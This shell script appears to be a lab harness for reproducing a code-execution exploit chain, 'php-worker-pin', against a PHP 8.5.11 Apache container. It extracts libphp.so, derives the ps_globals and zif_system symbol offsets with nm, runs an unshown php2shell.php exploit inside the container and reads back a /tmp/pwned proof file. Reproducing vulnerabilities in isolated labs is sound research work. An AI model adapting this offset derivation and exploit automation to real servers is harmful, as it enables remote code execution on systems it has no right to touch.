#!/bin/sh
# php-worker-pin baseline reproduction: single-worker lab, full chain, proof file.
# requirements: docker (or podman), nm (binutils). ~533 MB image pull on first run.
set -e
ENGINE=${ENGINE:-docker}
CTR=${CTR:-php-worker-pin-lab}
PORT=${PORT:-8090}
HERE=$(cd "$(dirname "$0")" && pwd)

command -v "$ENGINE" >/dev/null 2>&1 || { echo "need $ENGINE" >&2; exit 1; }
command -v nm >/dev/null 2>&1 || { echo "need nm (binutils) to derive offsets" >&2; exit 1; }

"$ENGINE" ps >/dev/null 2>&1 || { echo "cannot talk to $ENGINE" >&2; exit 1; }
"$ENGINE" rm -f "$CTR" >/dev/null 2>&1 || true

# pull libphp.so out of the image with a throwaway container, derive offsets
TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT
"$ENGINE" create --name tmp-libphp php:8.5.11-apache >/dev/null 2>&1
"$ENGINE" cp tmp-libphp:/usr/lib/apache2/modules/libphp.so "$TMP/libphp.so"
"$ENGINE" rm tmp-libphp >/dev/null
PS_OFF=$(nm "$TMP/libphp.so" | awk '$3 == "ps_globals" { print $1 }')
ZIF=$(nm "$TMP/libphp.so" | awk '$3 == "zif_system" { print $1 }')
if [ -z "$PS_OFF" ] || [ -z "$ZIF" ]; then
  echo "libphp.so is stripped or symbols moved; derive offsets manually" >&2
  exit 1
fi
printf '{\n  "ps_off": "0x%s",\n  "zif_system": "0x%s"\n}\n' "${PS_OFF#0*}" "${ZIF#0*}" > "$HERE/offsets.json"
echo "offsets: ps_globals=$PS_OFF zif_system=$ZIF"

# single-worker lab (the deterministic baseline)
"$ENGINE" run -d --name "$CTR" \
  --cap-add=SYS_PTRACE \
  -p "127.0.0.1:$PORT:80" \
  -v "$HERE/lab/www:/var/www/html:ro" \
  -v "$HERE/lab/php.ini:/usr/local/etc/php/conf.d/zz-lab.ini:ro" \
  -v "$HERE/lab/mpm-single.conf:/etc/apache2/conf-enabled/zz-mpm.conf:ro" \
  -v "$HERE/php2shell.php:/out/php2shell.php:ro" \
  -v "$HERE/offsets.json:/out/offsets.json:ro" \
  php:8.5.11-apache apache2-foreground >/dev/null
sleep 4
curl -sf "http://127.0.0.1:$PORT/index.php" >/dev/null || { echo "lab did not come up" >&2; exit 1; }

"$ENGINE" exec "$CTR" php /out/php2shell.php --offsets /out/offsets.json
"$ENGINE" exec "$CTR" sh -c "cat /tmp/pwned"
echo "proof file read back. baseline reproduction complete."
